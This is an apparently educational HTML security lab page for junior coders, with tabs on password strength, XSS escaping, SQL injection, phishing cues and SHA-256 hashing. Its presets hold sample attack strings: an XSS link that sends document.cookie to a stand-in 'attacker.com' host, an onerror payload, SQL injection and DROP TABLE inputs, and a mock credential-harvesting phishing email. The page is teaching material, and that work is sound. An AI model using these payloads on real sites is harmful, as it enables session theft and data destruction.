@@ -1,0 +1,568 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cyber Defense Studio | Junior Coders Lab</title>
+    <link rel="stylesheet" href="../styles/main.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;800&family=Fira+Code:wght@400;500;600&display=swap" rel="stylesheet">
+    <style>
+        .lab-container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 1.5rem 2rem;
+        }
+        .lab-tabs {
+            display: flex;
+            gap: 0.5rem;
+            flex-wrap: wrap;
+            margin-bottom: 1.5rem;
+            border-bottom: 1px solid #334155;
+            padding-bottom: 0.75rem;
+        }
+        .lab-tab-btn {
+            background: #1e293b;
+            color: #94a3b8;
+            border: 1px solid #334155;
+            padding: 0.6rem 1.2rem;
+            border-radius: 8px;
+            font-weight: 700;
+            font-size: 0.9rem;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+        .lab-tab-btn:hover {
+            background: #334155;
+            color: #f8fafc;
+        }
+        .lab-tab-btn.active {
+            background: #059669;
+            color: #ffffff;
+            border-color: #059669;
+            box-shadow: 0 4px 14px rgba(5, 150, 105, 0.4);
+        }
+        .studio-card {
+            background: #0f172a;
+            border: 1px solid #334155;
+            border-radius: 16px;
+            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+            margin-bottom: 2rem;
+        }
+        .studio-card-header {
+            background: #1e293b;
+            padding: 1rem 1.5rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid #334155;
+            flex-wrap: wrap;
+            gap: 0.75rem;
+        }
+        .studio-card-body {
+            padding: 1.5rem;
+        }
+        .form-row {
+            display: flex;
+            gap: 0.75rem;
+            margin-bottom: 1rem;
+            flex-wrap: wrap;
+        }
+        .form-input {
+            background: #090d16;
+            border: 1px solid #334155;
+            color: #f8fafc;
+            padding: 0.65rem 1rem;
+            border-radius: 8px;
+            font-family: var(--font-mono, monospace);
+            font-size: 0.9rem;
+            outline: none;
+            flex: 1;
+        }
+        .form-input:focus {
+            border-color: #10b981;
+            box-shadow: 0 0 0 2px rgba(16, 185, 129, 0.25);
+        }
+        .btn-action {
+            background: #059669;
+            color: white;
+            border: none;
+            padding: 0.65rem 1.5rem;
+            border-radius: 8px;
+            font-weight: 700;
+            font-size: 0.9rem;
+            cursor: pointer;
+            transition: all 0.15s ease;
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+        .btn-action:hover {
+            background: #047857;
+            transform: translateY(-1px);
+        }
+        .wire-box {
+            background: #020617;
+            border: 1px solid #1e293b;
+            border-radius: 10px;
+            padding: 1.25rem;
+            font-family: var(--font-mono, monospace);
+            font-size: 0.88rem;
+            color: #34d399;
+            line-height: 1.6;
+            overflow-x: auto;
+            white-space: pre-wrap;
+        }
+        .meter-bar {
+            height: 10px;
+            background: #1e293b;
+            border-radius: 9999px;
+            overflow: hidden;
+            margin: 0.75rem 0;
+        }
+        .meter-fill {
+            height: 100%;
+            width: 20%;
+            background: #ef4444;
+            transition: all 0.3s ease;
+        }
+        .flag-box {
+            background: rgba(239, 68, 68, 0.1);
+            border: 1px solid rgba(239, 68, 68, 0.3);
+            border-radius: 8px;
+            padding: 0.75rem 1rem;
+            color: #fca5a5;
+            margin-top: 0.5rem;
+            font-size: 0.88rem;
+        }
+    </style>
+</head>
+<body style="background: #090d16; color: #f8fafc; font-family: 'Outfit', sans-serif;">
+
+    <header style="background: #0f172a; border-bottom: 1px solid #1e293b; padding: 1.25rem 2rem;">
+        <div style="max-width: 1400px; margin: 0 auto; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 1rem;">
+            <div style="display: flex; align-items: center; gap: 0.75rem;">
+                <span style="font-size: 2rem;">🛡️</span>
+                <div>
+                    <h1 style="margin: 0; font-size: 1.35rem; color: #fff;">Cyber Defense Studio &amp; Security Lab</h1>
+                    <p style="margin: 0; font-size: 0.82rem; color: #94a3b8;">Interactive simulation workbench for passwords, XSS defense, SQL injection, and phishing.</p>
+                </div>
+            </div>
+            <div style="display: flex; gap: 0.6rem;">
+                <a href="../book-cybersecurity/index.html" class="lab-tab-btn" style="text-decoration: none;">📖 Textbook</a>
+                <a href="learningcybersecurity.html" class="lab-tab-btn" style="text-decoration: none;">📚 Syllabus</a>
+            </div>
+        </div>
+    </header>
+
+    <div class="lab-container">
+        <!-- Studio Navigation Tabs -->
+        <div class="lab-tabs" role="tablist">
+            <button type="button" class="lab-tab-btn active" onclick="switchCyberTab('password', this)">🔑 Password Entropy &amp; Cracking</button>
+            <button type="button" class="lab-tab-btn" onclick="switchCyberTab('xss', this)">💉 XSS Sanitizer Sandbox</button>
+            <button type="button" class="lab-tab-btn" onclick="switchCyberTab('sqli', this)">🗄️ SQL Injection Visualizer</button>
+            <button type="button" class="lab-tab-btn" onclick="switchCyberTab('phishing', this)">🎣 Phishing Detective</button>
+            <button type="button" class="lab-tab-btn" onclick="switchCyberTab('crypto', this)">🧮 SHA-256 Avalanche Lab</button>
+        </div>
+
+        <!-- 1. PASSWORD ENTROPY & CRACKING SIMULATOR -->
+        <section id="tab-password" class="studio-card">
+            <div class="studio-card-header">
+                <div>
+                    <h2 style="margin: 0; font-size: 1.2rem; color: #34d399;">Password Entropy &amp; GPU Cracking Estimator</h2>
+                    <p style="margin: 0.2rem 0 0; font-size: 0.82rem; color: #94a3b8;">Test password strength, calculate bits of entropy, and estimate resistance to an RTX 4090 GPU cluster.</p>
+                </div>
+                <button type="button" class="btn-action" onclick="generatePassphrase()">Generate 4-Word Passphrase 🎲</button>
+            </div>
+
+            <div class="studio-card-body">
+                <div class="form-row">
+                    <input type="text" id="pwdInput" class="form-input" value="Summer2026!" placeholder="Type a password to test..." oninput="evaluatePassword()">
+                </div>
+
+                <div class="meter-bar">
+                    <div id="pwdMeterFill" class="meter-fill"></div>
+                </div>
+
+                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 1rem; margin-top: 1.5rem;">
+                    <div style="background: #020617; border: 1px solid #1e293b; border-radius: 10px; padding: 1rem;">
+                        <span style="font-size: 0.75rem; color: #94a3b8; text-transform: uppercase;">Entropy</span>
+                        <div id="pwdEntropy" style="font-size: 1.3rem; font-weight: 700; color: #38bdf8; font-family: monospace;">45.2 bits</div>
+                    </div>
+                    <div style="background: #020617; border: 1px solid #1e293b; border-radius: 10px; padding: 1rem;">
+                        <span style="font-size: 0.75rem; color: #94a3b8; text-transform: uppercase;">Strength Verdict</span>
+                        <div id="pwdStrength" style="font-size: 1.3rem; font-weight: 700; color: #f59e0b;">Moderate ⚠️</div>
+                    </div>
+                    <div style="background: #020617; border: 1px solid #1e293b; border-radius: 10px; padding: 1rem;">
+                        <span style="font-size: 0.75rem; color: #94a3b8; text-transform: uppercase;">Est. GPU Crack Time</span>
+                        <div id="pwdCrackTime" style="font-size: 1.3rem; font-weight: 700; color: #f87171; font-family: monospace;">~2 hours</div>
+                    </div>
+                </div>
+
+                <div style="margin-top: 1.5rem; background: #020617; border: 1px solid #1e293b; border-radius: 10px; padding: 1.25rem;">
+                    <h3 style="font-size: 0.95rem; color: #cbd5e1; margin-bottom: 0.5rem;">Checklist &amp; Character Pool Analysis</h3>
+                    <div id="pwdChecklist" style="display: grid; grid-template-columns: 1fr 1fr; gap: 0.5rem; font-size: 0.88rem; color: #cbd5e1;"></div>
+                </div>
+            </div>
+        </section>
+
+        <!-- 2. XSS SANITIZER SANDBOX -->
+        <section id="tab-xss" class="studio-card" style="display:none;">
+            <div class="studio-card-header">
+                <div>
+                    <h2 style="margin: 0; font-size: 1.2rem; color: #34d399;">XSS Sanitizer &amp; Output Encoding Sandbox</h2>
+                    <p style="margin: 0.2rem 0 0; font-size: 0.82rem; color: #94a3b8;">Observe how raw HTML injection triggers execution versus how context-aware entity encoding neutralizes attacks.</p>
+                </div>
+                <div>
+                    <label for="xssPresets" style="font-size: 0.8rem; color: #cbd5e1; margin-right: 0.5rem;">Presets:</label>
+                    <select id="xssPresets" class="form-input" style="padding: 0.4rem 0.8rem;" onchange="loadXssPreset(this.value)">
+                        <option value="script">Injected Script Tag</option>
+                        <option value="img">Image Error Handler</option>
+                        <option value="link">Malicious JavaScript Link</option>
+                    </select>
+                </div>
+            </div>
+
+            <div class="studio-card-body">
+                <label for="xssInput" style="font-size: 0.85rem; color: #cbd5e1; display: block; margin-bottom: 0.35rem;">Untrusted User Comment:</label>
+                <textarea id="xssInput" class="form-input" style="width: 100%; height: 80px; margin-bottom: 1rem;" oninput="updateXssPreview()">&lt;script&gt;alert('Session Cookie Stolen: ' + document.cookie)&lt;/script&gt;</textarea>
+
+                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 1.25rem;">
+                    <div>
+                        <h3 style="font-size: 0.95rem; color: #f87171; margin-bottom: 0.5rem;">❌ Vulnerable Output (Raw innerHTML)</h3>
+                        <div id="xssUnsafeOutput" class="wire-box" style="border-color: rgba(239, 68, 68, 0.4); color: #fca5a5;"></div>
+                        <div class="flag-box">⚠️ DANGER: If executed, the browser treats user input as code, granting the attacker full control over the session!</div>
+                    </div>
+
+                    <div>
+                        <h3 style="font-size: 0.95rem; color: #34d399; margin-bottom: 0.5rem;">✅ Secure Output (htmlspecialchars / textContent)</h3>
+                        <div id="xssSafeOutput" class="wire-box" style="border-color: rgba(16, 185, 129, 0.4); color: #34d399;"></div>
+                        <div style="background: rgba(16, 185, 129, 0.1); border: 1px solid rgba(16, 185, 129, 0.3); border-radius: 8px; padding: 0.75rem 1rem; color: #86efac; margin-top: 0.5rem; font-size: 0.88rem;">
+                            🛡️ PROTECTED: Special characters are converted to harmless HTML entities (&amp;lt; &amp;gt;), displayed purely as inert text!
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- 3. SQL INJECTION VISUALIZER -->
+        <section id="tab-sqli" class="studio-card" style="display:none;">
+            <div class="studio-card-header">
+                <div>
+                    <h2 style="margin: 0; font-size: 1.2rem; color: #34d399;">SQL Injection Visualizer: Concatenation vs. Prepared Statements</h2>
+                    <p style="margin: 0.2rem 0 0; font-size: 0.82rem; color: #94a3b8;">See how untrusted strings break query boundaries and how PDO parameters keep SQL commands immune.</p>
+                </div>
+                <div>
+                    <select id="sqliPresets" class="form-input" style="padding: 0.4rem 0.8rem;" onchange="loadSqliPreset(this.value)">
+                        <option value="normal">Normal User ("amina")</option>
+                        <option value="bypass" selected>Auth Bypass ("admin' OR '1'='1' --")</option>
+                        <option value="drop">Malicious Suffix ("'; DROP TABLE logs; --")</option>
+                    </select>
+                </div>
+            </div>
+
+            <div class="studio-card-body">
+                <div class="form-row">
+                    <input type="text" id="sqliUserInput" class="form-input" value="admin' OR '1'='1' --" placeholder="Enter username..." oninput="updateSqliPreview()">
+                </div>
+
+                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 1.25rem;">
+                    <div>
+                        <h3 style="font-size: 0.95rem; color: #f87171; margin-bottom: 0.5rem;">❌ Vulnerable Concatenation Query</h3>
+                        <div id="sqliVulnerableWire" class="wire-box" style="border-color: rgba(239, 68, 68, 0.4); color: #fca5a5;"></div>
+                        <div class="flag-box">
+                            🚨 VULNERABILITY: The single quote breaks out of the string literal! '1'='1' forces the entire WHERE clause to True, granting admin access without a password!
+                        </div>
+                    </div>
+
+                    <div>
+                        <h3 style="font-size: 0.95rem; color: #34d399; margin-bottom: 0.5rem;">✅ Secure Prepared Statement (PDO)</h3>
+                        <div id="sqliSecureWire" class="wire-box" style="border-color: rgba(16, 185, 129, 0.4); color: #34d399;"></div>
+                        <div style="background: rgba(16, 185, 129, 0.1); border: 1px solid rgba(16, 185, 129, 0.3); border-radius: 8px; padding: 0.75rem 1rem; color: #86efac; margin-top: 0.5rem; font-size: 0.88rem;">
+                            🛡️ IMMUNE: The database compiles the SQL statement first. The user input is bound purely as a literal value—never parsed as SQL code!
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- 4. PHISHING DETECTIVE -->
+        <section id="tab-phishing" class="studio-card" style="display:none;">
+            <div class="studio-card-header">
+                <div>
+                    <h2 style="margin: 0; font-size: 1.2rem; color: #34d399;">Phishing Detective &amp; Email Header Inspector</h2>
+                    <p style="margin: 0.2rem 0 0; font-size: 0.82rem; color: #94a3b8;">Audit a simulated urgent notification. Uncover deceptive lookalike domains and mismatched hyperlinks.</p>
+                </div>
+                <button type="button" class="btn-action" onclick="togglePhishingRedFlags()">Reveal All Red Flags 🚩</button>
+            </div>
+
+            <div class="studio-card-body">
+                <div style="background: #020617; border: 1px solid #1e293b; border-radius: 12px; padding: 1.5rem; max-width: 800px; margin: 0 auto;">
+                    <div style="border-bottom: 1px solid #334155; padding-bottom: 1rem; margin-bottom: 1rem; font-size: 0.9rem; line-height: 1.8;">
+                        <div><strong>From:</strong> "Junior Coders Academy" &lt;<span id="flagSender" style="color: #cbd5e1;">security-alerts@juni0r-coders.net</span>&gt;</div>
+                        <div><strong>To:</strong> student@school.edu</div>
+                        <div><strong>Subject:</strong> <span id="flagSubject" style="color: #cbd5e1;">URGENT: Verify your scholarship account within 6 hours or lose access!</span></div>
+                        <div style="display: flex; gap: 0.5rem; margin-top: 0.25rem;">
+                            <span class="flag-box" style="margin:0; padding: 0.15rem 0.5rem; font-size: 0.75rem; background: rgba(239,68,68,0.2);">SPF: SoftFail</span>
+                            <span class="flag-box" style="margin:0; padding: 0.15rem 0.5rem; font-size: 0.75rem; background: rgba(239,68,68,0.2);">DKIM: None</span>
+                        </div>
+                    </div>
+
+                    <div style="color: #cbd5e1; font-size: 0.95rem; line-height: 1.6;">
+                        <p>Dear Student,</p>
+                        <p>We detected unauthorized login attempts to your academic portfolio from an unrecognized device in Eastern Europe.</p>
+                        <p>To avoid immediate account termination and maintain your scholarship status, please verify your credentials below:</p>
+
+                        <div style="text-align: center; margin: 1.5rem 0;">
+                            <a id="flagLink" href="#" style="background: #dc2626; color: white; padding: 0.75rem 1.5rem; border-radius: 8px; text-decoration: none; font-weight: 700; display: inline-block;">
+                                🔒 Verify Account Credentials Immediately
+                            </a>
+                            <div id="flagUrlHint" style="font-size: 0.75rem; color: #94a3b8; margin-top: 0.35rem; font-family: monospace;">
+                                Hover preview: http://198.51.100.88/fake-login/harvest.php
+                            </div>
+                        </div>
+
+                        <p>If you fail to complete verification before 18:00 today, your access will be permanently revoked.</p>
+                        <p>Sincerely,<br><em>Global Support Desk</em></p>
+                    </div>
+
+                    <div id="phishingExplanation" style="display:none; margin-top: 1.5rem; border-top: 1px dashed #ef4444; padding-top: 1rem;">
+                        <h4 style="color: #f87171; margin: 0 0 0.5rem;">🚩 Forensic Deception Analysis:</h4>
+                        <ul style="color: #fca5a5; font-size: 0.88rem; line-height: 1.6; padding-left: 1.2rem;">
+                            <li><strong>Lookalike Typosquatting:</strong> <code>juni0r-coders.net</code> uses a zero <code>0</code> instead of the letter <code>o</code>!</li>
+                            <li><strong>Coercive Urgency:</strong> Demands action in "6 hours" to induce panic and disable critical thinking.</li>
+                            <li><strong>Mismatched IP Destination:</strong> The button links directly to an unencrypted HTTP raw IP address running a credential harvester.</li>
+                            <li><strong>Failed Authentication:</strong> SPF SoftFail indicates the email was dispatched from an unauthorized mail server.</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- 5. SHA-256 AVALANCHE LAB -->
+        <section id="tab-crypto" class="studio-card" style="display:none;">
+            <div class="studio-card-header">
+                <div>
+                    <h2 style="margin: 0; font-size: 1.2rem; color: #34d399;">Cryptographic Hash Lab &amp; The Avalanche Effect</h2>
+                    <p style="margin: 0.2rem 0 0; font-size: 0.82rem; color: #94a3b8;">See how modifying a single character flips over 50% of the bits in a 256-bit cryptographic digest.</p>
+                </div>
+            </div>
+
+            <div class="studio-card-body">
+                <label for="hashInput" style="font-size: 0.85rem; color: #cbd5e1; display: block; margin-bottom: 0.35rem;">Enter Plaintext Message:</label>
+                <input type="text" id="hashInput" class="form-input" value="Bismillah" placeholder="Type text..." oninput="calculateSha256()">
+
+                <div style="margin-top: 1.5rem;">
+                    <span style="font-size: 0.75rem; color: #94a3b8; text-transform: uppercase;">SHA-256 Cryptographic Hash (Hex Digest - 64 Characters / 256 Bits)</span>
+                    <div id="hashOutput" class="wire-box" style="font-size: 1.05rem; margin-top: 0.35rem;">Computing...</div>
+                </div>
+
+                <div style="margin-top: 1rem; background: #020617; border: 1px solid #1e293b; border-radius: 10px; padding: 1rem; font-size: 0.88rem; color: #cbd5e1;">
+                    💡 <strong>Try this experiment:</strong> Add a single exclamation mark <code>!</code> to the word and observe how the hash transforms into an entirely new, unrecognizable value. This is the <strong>Avalanche Effect</strong>!
+                </div>
+            </div>
+        </section>
+    </div>
+
+    <script>
+        function switchCyberTab(tabId, btn) {
+            document.querySelectorAll('.lab-tab-btn').forEach(b => b.classList.remove('active'));
+            if (btn) btn.classList.add('active');
+
+            ['password', 'xss', 'sqli', 'phishing', 'crypto'].forEach(id => {
+                const el = document.getElementById(`tab-${id}`);
+                if (el) el.style.display = (id === tabId) ? 'block' : 'none';
+            });
+
+            if (tabId === 'password') evaluatePassword();
+            if (tabId === 'xss') updateXssPreview();
+            if (tabId === 'sqli') updateSqliPreview();
+            if (tabId === 'crypto') calculateSha256();
+        }
+
+        // Password Entropy Logic
+        function evaluatePassword() {
+            const pwd = document.getElementById('pwdInput').value;
+            const len = pwd.length;
+
+            let pool = 0;
+            const hasLower = /[a-z]/.test(pwd);
+            const hasUpper = /[A-Z]/.test(pwd);
+            const hasNum = /[0-9]/.test(pwd);
+            const hasSym = /[^a-zA-Z0-9]/.test(pwd);
+
+            if (hasLower) pool += 26;
+            if (hasUpper) pool += 26;
+            if (hasNum) pool += 10;
+            if (hasSym) pool += 33;
+
+            let entropy = 0;
+            if (len > 0 && pool > 0) {
+                entropy = len * (Math.log2(pool));
+            }
+
+            // Dictionary check penalty
+            const commonWords = ['password', 'summer', 'admin', 'qwerty', '123456'];
+            const isCommon = commonWords.some(w => pwd.toLowerCase().includes(w));
+            if (isCommon) entropy = Math.max(10, entropy - 25);
+
+            document.getElementById('pwdEntropy').textContent = `${entropy.toFixed(1)} bits`;
+
+            const fill = document.getElementById('pwdMeterFill');
+            const verdict = document.getElementById('pwdStrength');
+            const crack = document.getElementById('pwdCrackTime');
+
+            if (entropy < 30) {
+                fill.style.width = '20%';
+                fill.style.background = '#ef4444';
+                verdict.textContent = 'Very Weak ❌';
+                verdict.style.color = '#ef4444';
+                crack.textContent = '< 1 second';
+                crack.style.color = '#ef4444';
+            } else if (entropy < 50) {
+                fill.style.width = '45%';
+                fill.style.background = '#f59e0b';
+                verdict.textContent = 'Moderate ⚠️';
+                verdict.style.color = '#f59e0b';
+                crack.textContent = '~2 hours';
+                crack.style.color = '#f59e0b';
+            } else if (entropy < 70) {
+                fill.style.width = '75%';
+                fill.style.background = '#3b82f6';
+                verdict.textContent = 'Strong 🛡️';
+                verdict.style.color = '#3b82f6';
+                crack.textContent = '~500 years';
+                crack.style.color = '#3b82f6';
+            } else {
+                fill.style.width = '100%';
+                fill.style.background = '#10b981';
+                verdict.textContent = 'Impenetrable 🏰';
+                verdict.style.color = '#10b981';
+                crack.textContent = '> 100,000 years!';
+                crack.style.color = '#10b981';
+            }
+
+            const checklist = document.getElementById('pwdChecklist');
+            checklist.innerHTML = `
+                <div>${len >= 14 ? '✅' : '❌'} Length: ${len} chars (Recommended 14+)</div>
+                <div>${hasLower ? '✅' : '❌'} Lowercase letters (a-z)</div>
+                <div>${hasUpper ? '✅' : '❌'} Uppercase letters (A-Z)</div>
+                <div>${hasNum ? '✅' : '❌'} Numerical digits (0-9)</div>
+                <div>${hasSym ? '✅' : '❌'} Special symbols (!@#$...)</div>
+                <div>${!isCommon ? '✅' : '⚠️'} Dictionary word avoidance</div>
+            `;
+        }
+
+        function generatePassphrase() {
+            const words = [
+                'falcon', 'olive', 'river', 'meadow', 'cedar', 'summit',
+                'harbor', 'galaxy', 'canyon', 'breeze', 'oasis', 'lantern',
+                'starlight', 'amber', 'citadel', 'compass', 'valley', 'horizon'
+            ];
+            const p1 = words[Math.floor(Math.random() * words.length)];
+            const p2 = words[Math.floor(Math.random() * words.length)];
+            const p3 = words[Math.floor(Math.random() * words.length)];
+            const p4 = words[Math.floor(Math.random() * words.length)];
+
+            document.getElementById('pwdInput').value = `${p1}-${p2}-${p3}-${p4}`;
+            evaluatePassword();
+        }
+
+        // XSS Sandbox Logic
+        function loadXssPreset(type) {
+            const input = document.getElementById('xssInput');
+            if (type === 'script') {
+                input.value = "<script>alert('Session Cookie Stolen: ' + document.cookie)</" + "script>";
+            } else if (type === 'img') {
+                input.value = '<img src="invalid-image.jpg" onerror="alert(\'Stealth XSS via Image Error Handler!\')">';
+            } else if (type === 'link') {
+                input.value = '<a href="javascript:fetch(\'https://attacker.com/steal?c=\'+document.cookie)">Click here for free reward!</a>';
+            }
+            updateXssPreview();
+        }
+
+        function updateXssPreview() {
+            const val = document.getElementById('xssInput').value;
+            document.getElementById('xssUnsafeOutput').textContent = val;
+
+            // Safe HTML Entity Escaped output
+            const safe = val.replace(/&/g, '&amp;')
+                            .replace(/</g, '&lt;')
+                            .replace(/>/g, '&gt;')
+                            .replace(/"/g, '&quot;')
+                            .replace(/'/g, '&#039;');
+
+            document.getElementById('xssSafeOutput').textContent = safe;
+        }
+
+        // SQL Injection Visualizer
+        function loadSqliPreset(type) {
+            const input = document.getElementById('sqliUserInput');
+            if (type === 'normal') input.value = 'amina';
+            if (type === 'bypass') input.value = "admin' OR '1'='1' --";
+            if (type === 'drop') input.value = "'; DROP TABLE audit_logs; --";
+            updateSqliPreview();
+        }
+
+        function updateSqliPreview() {
+            const input = document.getElementById('sqliUserInput').value;
+
+            // Vulnerable Concatenation
+            const vulnSql = `SELECT * FROM users \nWHERE username = '${input}' \nAND password = '$password_hash';`;
+            document.getElementById('sqliVulnerableWire').textContent = vulnSql;
+
+            // Secure Prepared Statement
+            const secureSql = `// 1. Pre-compile query structure:\n$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :user");\n\n// 2. Safely bind parameters:\n$stmt->execute([':user' => '${input}']);\n\n// Parameter value is strictly treated as pure data!`;
+            document.getElementById('sqliSecureWire').textContent = secureSql;
+        }
+
+        // Phishing Detective
+        let redFlagsRevealed = false;
+        function togglePhishingRedFlags() {
+            redFlagsRevealed = !redFlagsRevealed;
+            const sender = document.getElementById('flagSender');
+            const subject = document.getElementById('flagSubject');
+            const link = document.getElementById('flagLink');
+            const exp = document.getElementById('phishingExplanation');
+
+            if (redFlagsRevealed) {
+                sender.style.background = 'rgba(239,68,68,0.3)';
+                sender.style.color = '#f87171';
+                subject.style.background = 'rgba(239,68,68,0.3)';
+                subject.style.color = '#f87171';
+                link.style.border = '2px dashed yellow';
+                exp.style.display = 'block';
+            } else {
+                sender.style.background = 'transparent';
+                sender.style.color = '#cbd5e1';
+                subject.style.background = 'transparent';
+                subject.style.color = '#cbd5e1';
+                link.style.border = 'none';
+                exp.style.display = 'none';
+            }
+        }
+
+        // Crypto Hash Lab (Subtle Web Crypto API)
+        async function calculateSha256() {
+            const text = document.getElementById('hashInput').value;
+            const msgUint8 = new TextEncoder().encode(text);
+            const hashBuffer = await crypto.subtle.digest('SHA-256', msgUint8);
+            const hashArray = Array.from(new Uint8Array(hashBuffer));
+            const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+            document.getElementById('hashOutput').textContent = hashHex;
+        }
+
+        window.addEventListener('DOMContentLoaded', () => {
+            evaluatePassword();
+            updateXssPreview();
+            updateSqliPreview();
+            calculateSha256();
+        });
+    </script>
+</body>
+</html>
